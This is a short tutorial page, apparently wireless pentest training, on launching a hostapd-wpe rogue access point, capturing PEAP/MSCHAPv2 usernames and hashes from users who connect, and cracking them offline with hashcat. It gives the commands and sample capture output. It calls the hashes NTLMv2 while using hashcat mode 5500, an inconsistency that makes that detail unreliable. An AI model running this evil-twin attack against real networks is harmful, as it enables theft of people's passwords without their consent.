`hostapd-wpe` - Execution & Capture

Launching the Rogue AP and Harvesting Hashes

Starting the Rogue AP

Execute hostapd-wpe with your configuration file to begin broadcasting the malicious SSID. This makes your system act as an enterprise access point.

sudo hostapd-wpe hostapd-wpe.conf

Capturing Credentials

As users connect and attempt to authenticate, hostapd-wpe logs their EAP credentials, typically including usernames and NTLMv2 hashes for PEAP/MSCHAPv2.

# Example output from hostapd-wpe
[...] EAP-MSCHAPv2: Client 'testuser' authenticated.
EAP-MSCHAPv2: Captured NTLMv2 hash for 'testuser': testuser::DOMAIN:challenge:response:clientchallenge

Post-Capture: Offline Cracking

Once NTLMv2 hashes are captured, they can be cracked offline using tools like hashcat or John the Ripper to recover the plaintext passwords.

hashcat -m 5500 captured_mschapv2.hash /usr/share/wordlists/rockyou.txt
  • -m 5500: Specifies the hash mode for MSCHAPv2.
  • captured_mschapv2.hash: Your file containing the captured hashes.
  • /usr/share/wordlists/rockyou.txt: A common wordlist for dictionary attacks.
Key Takeaway

The execution of hostapd-wpe allows for real-time credential capture, providing NTLMv2 hashes that can be cracked offline to reveal user passwords.
